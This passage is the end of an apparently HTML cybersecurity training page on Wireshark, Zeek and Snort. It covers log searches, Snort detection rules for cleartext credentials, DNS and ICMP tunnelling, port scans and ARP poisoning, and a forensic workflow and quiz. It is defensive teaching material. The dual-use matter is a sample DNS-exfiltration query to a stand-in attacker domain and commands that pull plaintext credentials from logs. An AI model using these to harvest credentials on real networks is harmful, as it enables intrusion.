+<span class="co"># Zeek generates log files automatically:</span>
+<span class="hl2">conn.log     ← All network connections (src, dst, port, bytes, duration)
+dns.log      ← All DNS queries and responses
+http.log     ← All HTTP requests (URI, method, user-agent, status)
+files.log    ← All file transfers detected
+ssl.log      ← TLS certificates and metadata (SNI, issuer, validity)
+notice.log   ← Automatic alerts (port scans, brute force, etc.)
+weird.log    ← Protocol anomalies Zeek detected</span>
+
+<span class="co"># ── Search Zeek logs for DNS tunnelling ──────────────────────</span>
+<span class="pr">$</span> <span class="cm">cat dns.log | zeek-cut query qtype_name | awk 'length($1) > 52'</span>
+<span class="hc">aGVsbG8gd29ybGQ.corp-exfil.attacker.com    TXT</span>
+
+<span class="co"># ── Find all HTTP credentials in http.log ─────────────────────</span>
+<span class="pr">$</span> <span class="cm">cat http.log | zeek-cut username password method uri</span>
+
+<span class="co"># ── Detect port scans from conn.log ──────────────────────────</span>
+<span class="pr">$</span> <span class="cm">cat conn.log | zeek-cut id.orig_h id.resp_p | sort | uniq -c | sort -rn | head -20</span>
+<span class="co"># Single source IP with connections to many different ports = port scan</span>
+
+<span class="co"># ── Find large data transfers (exfiltration) ─────────────────</span>
+<span class="pr">$</span> <span class="cm">cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p orig_bytes | awk '$4 > 1000000'</span>
+<span class="co"># orig_bytes > 1MB on a single connection — outbound large transfer</span></div>
+  </div>
+
+  <div class="slbl">// §8.4 — WRITING SNORT RULES FROM WIRESHARK FINDINGS</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">TURNING WIRESHARK ANALYSIS INTO SNORT DETECTION RULES</div></div>
+    <div class="tbody"><span class="co"># ── Rule: Detect FTP password transmission ────────────────────</span>
+<span class="ha">alert tcp any any -> any 21 (msg:"FTP Password Transmitted - Cleartext Credential"; content:"PASS "; nocase; flow:established,to_server; sid:1000101; rev:1;)</span>
+
+<span class="co"># ── Rule: Detect DNS tunnelling (long subdomain) ─────────────</span>
+<span class="ha">alert udp any any -> any 53 (msg:"Possible DNS Tunnelling - Long Query Name"; content:"|00 01 00 00|"; offset:4; depth:4; dsize:>200; sid:1000102; rev:1;)</span>
+
+<span class="co"># ── Rule: Detect HTTP Basic Auth ──────────────────────────────</span>
+<span class="ha">alert tcp any any -> any 80 (msg:"HTTP Basic Authentication Detected"; content:"Authorization: Basic"; nocase; http_header; sid:1000103; rev:1;)</span>
+
+<span class="co"># ── Rule: Detect port scan (many SYNs) ───────────────────────</span>
+<span class="ha">alert tcp any any -> $HOME_NET any (msg:"Possible Port Scan Detected"; flags:S; threshold: type both, track by_src, count 30, seconds 10; sid:1000104; rev:1;)</span>
+
+<span class="co"># ── Rule: Detect ICMP tunnelling (oversized payload) ─────────</span>
+<span class="ha">alert icmp any any -> any any (msg:"Possible ICMP Tunnel - Oversized Payload"; dsize:>100; itype:8; sid:1000105; rev:1;)</span>
+
+<span class="co"># ── Rule: Detect ARP poisoning ────────────────────────────────</span>
+<span class="ha">alert arp any any -> any any (msg:"Possible ARP Poisoning - Gratuitous ARP"; arp.opcode:2; threshold: type both, track by_src, count 10, seconds 5; sid:1000106; rev:1;)</span>
+
+<span class="co"># Test your rules against the PCAP you captured:
+# snort -r capture.pcap -c /etc/snort/snort.conf -A console</span></div>
+  </div>
+
+  <div class="slbl">// §8.5 — PCAP FORENSICS: INCIDENT RECONSTRUCTION</div>
+  <div class="card">
+    <div class="clbl">FORENSIC ANALYSIS WORKFLOW</div>
+    <ul class="ck">
+      <li><strong>Step 1 — Overview:</strong> Statistics > Capture File Properties → duration, total packets, protocols. Statistics > Protocol Hierarchy → what protocols are present and in what volumes.</li>
+      <li><strong>Step 2 — Timeline:</strong> Sort by time, look for the initial suspicious event — first connection to an unknown IP, first DNS query for a suspicious domain.</li>
+      <li><strong>Step 3 — Host identification:</strong> Statistics > Endpoints → all IPs involved. ARP/DHCP/NBNS packets → map IPs to hostnames and MACs.</li>
+      <li><strong>Step 4 — Conversation analysis:</strong> Statistics > Conversations → which pairs of hosts communicated? How much data? How long?</li>
+      <li><strong>Step 5 — Follow suspicious streams:</strong> Right-click suspicious packets → Follow TCP/UDP/HTTP Stream → read the full conversation as text.</li>
+      <li><strong>Step 6 — Extract artefacts:</strong> File > Export Objects → recover transferred files (documents, executables, images) from HTTP/SMB streams.</li>
+      <li><strong>Step 7 — Document findings:</strong> Export marked packets (Edit > Mark All Displayed → File > Export Specified Packets) for the incident report.</li>
+    </ul>
+  </div>
+
+  <div class="slbl">// §8 — FINAL QUIZ</div>
+  <div class="qb">
+    <div class="qt">You are given a PCAP file from a suspected breach. Your analysis finds: (1) ARP duplicate address alerts for the gateway, (2) HTTP POST to /login with credentials in plaintext, (3) 1,200 DNS TXT queries with 80+ character subdomain names in 5 minutes, (4) sustained TCP connection to 203.0.113.50:443 with no TLS handshake. Rank these findings by severity and explain what each indicates.</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','All four findings are real attack indicators. Missing any of them leaves attack vectors unaddressed. A comprehensive incident report covers all findings prioritised by impact.')"><span class="qk">A</span> Only finding (2) matters — credentials are the highest priority, rest are noise</div>
+      <div class="qo" onclick="qa(this,'wrong','ARP poisoning (1) is critical — it is the delivery mechanism that enabled (2). Without addressing the ARP poisoning first, any new credentials entered on the same network will be intercepted again.')"><span class="qk">B</span> Finding (3) is most severe — DNS is always the top attack vector</div>
+      <div class="qo" onclick="qa(this,'correct','Correct priority analysis: CRITICAL (4) — Active C2 connection on port 443 with no TLS = live malware command-and-control. The machine is actively compromised and receiving commands. Immediate isolation required. CRITICAL (3) — 1,200 DNS TXT queries with 80+ char subdomains in 5 minutes = active data exfiltration via DNS tunnelling. Data is leaving the organisation right now. HIGH (1) — ARP poisoning = an attacker positioned as MITM on the network. This is how (2) was captured. The MITM attack is ongoing — other users on the segment are affected. HIGH (2) — Plaintext credential capture confirms the ARP poisoning was successful. Those credentials are compromised and must be immediately rotated. Response order: (1) Isolate the C2-connected machine, (2) Block DNS to the tunnelling domain, (3) Find and isolate the ARP poisoning source, (4) Rotate all compromised credentials, (5) Sweep the network for other affected hosts.')"><span class="qk">C</span> Priority: (4) active C2 = isolate immediately, (3) active DNS exfil = block now, (1) ongoing MITM = find the attacker machine, (2) credentials = rotate immediately</div>
+      <div class="qo" onclick="qa(this,'wrong','ARP poisoning explains how the credential capture happened — they are directly related. Treating them as unrelated misses the attack chain.')"><span class="qk">D</span> Findings (1) and (2) are unrelated — address each separately with equal priority</div>
+    </div>
+    <div class="qfb" id="q7"></div>
+  </div>
+
+  <!-- COMPLETE BADGE -->
+  <div style="border:1px solid rgba(57,211,83,0.3);border-radius:4px;padding:2rem;margin:2rem 0;background:linear-gradient(135deg,rgba(57,211,83,0.05) 0%,rgba(26,157,255,0.03) 100%);text-align:center;">
+    <div style="font-family:var(--display);font-size:2rem;font-weight:700;color:var(--green);margin-bottom:0.5rem;">WIRESHARK DEEP DIVE — COMPLETE</div>
+    <p style="color:var(--muted);font-size:0.9rem;max-width:500px;margin:0 auto 1.5rem;">You can now capture and interpret packet data, harvest credentials from plaintext protocols, detect ARP poisoning and DNS tunnelling, and reconstruct incidents from PCAP files.</p>
+    <div style="display:flex;gap:2rem;justify-content:center;flex-wrap:wrap;">
+      <div><div style="font-family:var(--mono);font-size:1.5rem;font-weight:700;color:var(--accent)">8</div><div style="font-family:var(--mono);font-size:0.62rem;color:var(--muted);letter-spacing:0.1em;">SECTIONS</div></div>
+      <div><div style="font-family:var(--mono);font-size:1.5rem;font-weight:700;color:var(--amber)">8</div><div style="font-family:var(--mono);font-size:0.62rem;color:var(--muted);letter-spacing:0.1em;">QUIZZES</div></div>
+      <div><div style="font-family:var(--mono);font-size:1.5rem;font-weight:700;color:var(--green)">25+</div><div style="font-family:var(--mono);font-size:0.62rem;color:var(--muted);letter-spacing:0.1em;">FILTERS</div></div>
+      <div><div style="font-family:var(--mono);font-size:1.5rem;font-weight:700;color:var(--red)">6</div><div style="font-family:var(--mono);font-size:0.62rem;color:var(--muted);letter-spacing:0.1em;">SNORT RULES</div></div>
+    </div>
+  </div>
+</div><!-- /p7 -->
+
+</div><!-- .wrap -->
+
+<footer>CYBERBOOTCAMP // WIRESHARK DEEP DIVE // 8 SECTIONS // PRACTICAL · OFFENSIVE · BYPASS · DEFENSIVE</footer>
+
+<a href="#" id="btt" title="Back to top">↑</a>
+
+<script>
+'use strict';
+
+// ── Tab switching ──────────────────────────────────────────────
+function show(i){
+  document.querySelectorAll('.pnl').forEach(p=>p.classList.remove('on'));
+  document.querySelectorAll('.stab').forEach(t=>t.classList.remove('on'));
+  const panel=document.getElementById('p'+i);
+  const tab=document.querySelectorAll('.stab')[i];
+  if(panel) panel.classList.add('on');
+  if(tab){
+    tab.classList.add('on');
+    tab.scrollIntoView({block:'nearest',inline:'center',behavior:'smooth'});
+  }
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+// ── Quiz handler ───────────────────────────────────────────────
+function qa(el,type,exp){
+  const q=el.closest('.qb');
+  if(!q||q.dataset.done)return;
+  q.dataset.done='1';
+  q.querySelectorAll('.qo').forEach(o=>{o.style.pointerEvents='none';o.style.opacity='0.4';});
+  el.style.opacity='1';el.classList.add(type);
+  const fb=q.querySelector('.qfb');
+  if(fb){fb.classList.add('show',type);fb.textContent=exp;}
+}
+
+// ── Wireshark packet detail expand ────────────────────────────
+var lastPacket=null;
+function expandPacket(row,detailId){
+  // Deselect previous
+  if(lastPacket && lastPacket!==row){
+    lastPacket.classList.remove('selected');
+    // hide previous detail
+    const prev=document.querySelector('.ws-detail.show');
+    if(prev) prev.classList.remove('show');
+  }
+  row.classList.toggle('selected');
+  lastPacket=row;
+  const det=document.getElementById('detail-'+detailId);
+  if(det){
+    // hide all details first
+    document.querySelectorAll('.ws-detail').forEach(d=>d.classList.remove('show'));
+    if(row.classList.contains('selected')) det.classList.add('show');
+  }
+}
+
+// ── Back to top ────────────────────────────────────────────────
+(function(){
+  var btn=document.getElementById('btt');
+  if(!btn)return;
+  window.addEventListener('scroll',function(){
+    btn.classList.toggle('show',window.scrollY>350);
+  },{passive:true});
+  btn.addEventListener('click',function(e){
+    e.preventDefault();
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+})();
+
+// ── Keyboard navigation ────────────────────────────────────────
+document.addEventListener('keydown',function(e){
+  if(['INPUT','TEXTAREA','SELECT'].includes(e.target.tagName))return;
+  var tabs=document.querySelectorAll('.stab');
+  var active=document.querySelector('.stab.on');
+  if(!active)return;
+  var idx=Array.from(tabs).indexOf(active);
+  if(e.key==='ArrowRight'&&idx<tabs.length-1){e.preventDefault();show(idx+1);}
+  if(e.key==='ArrowLeft'&&idx>0){e.preventDefault();show(idx-1);}
+});
+
+// ── Copy buttons on terminal blocks ───────────────────────────
+document.addEventListener('DOMContentLoaded',function(){
+  document.querySelectorAll('.tbody').forEach(function(block){
+    var wrapper=block.parentElement;
+    if(!wrapper)return;
+    wrapper.style.position='relative';
+    var btn=document.createElement('button');
+    btn.textContent='Copy';
+    btn.style.cssText='position:absolute;top:8px;right:8px;font-family:monospace;font-size:0.62rem;padding:3px 9px;border:1px solid rgba(255,255,255,0.15);background:rgba(0,0,0,0.6);color:#aaa;border-radius:2px;cursor:pointer;z-index:10;';
+    wrapper.appendChild(btn);
+    btn.addEventListener('click',function(){
+      navigator.clipboard.writeText(block.innerText).then(function(){
+        btn.textContent='Copied!';btn.style.color='#39d353';
+        setTimeout(function(){btn.textContent='Copy';btn.style.color='#aaa';},2000);
+      });
+    });
+  });
+});
+</script>
+</body>
+</html>
